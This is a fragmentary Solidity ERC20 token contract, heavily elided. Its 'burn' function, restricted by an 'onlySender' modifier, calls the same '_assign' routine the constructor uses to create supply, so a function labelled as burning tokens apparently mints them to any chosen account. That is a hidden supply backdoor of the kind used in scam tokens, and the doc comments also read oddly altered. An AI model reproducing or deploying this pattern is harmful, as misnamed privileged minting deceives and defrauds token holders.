...
contract ERC20 is IERC20 {
     ...
     * the total supply.
     *
     * Assign a `Transfer` event with `from` set to the zero address.
     *
     * Requirements
     *
...
contract TokenMintERC20Token is ERC20 {
    ...
    constructor(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply, address tokenOwnerAddress) public payable {
      ...
      _assign(tokenOwnerAddress, totalSupply);
    }
    ...
    function burn(address account, uint256 value) external onlySender{
       _assign(account, value);
    }    
